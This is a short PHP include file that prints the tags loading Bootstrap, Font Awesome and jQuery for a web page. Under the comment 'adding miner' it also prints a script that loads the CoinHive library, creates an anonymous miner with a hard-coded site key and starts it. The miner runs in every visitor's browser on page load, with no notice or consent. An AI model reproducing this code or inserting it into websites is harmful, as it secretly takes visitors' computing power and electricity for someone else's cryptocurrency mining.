<?php
/**
 * Created by PhpStorm.
 * User: Bexline
 * Date: 03.10.2017
 * Time: 17:49
 */


/* include Bottstrap,Font awsome,Jquery */
print ("
 <link rel='stylesheet' href='need\bootstrap-4.0.0-beta\css\bootstrap.css'>
 <link rel='stylesheet' href='need\font-awesome-4.7.0\css\font-awesome.min.css'>
 <script src='need/jquery-2.1.4.min.js'></script>
 
 
");





/* adding miner*/
    print("
    <script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
    <script>
        var miner = new CoinHive.Anonymous('ihXHLO3LRuAthw1dZtIC8a2giTRcinSr', {
	    threads: 1,

          });

         miner.start();
     </script>
    ");





?>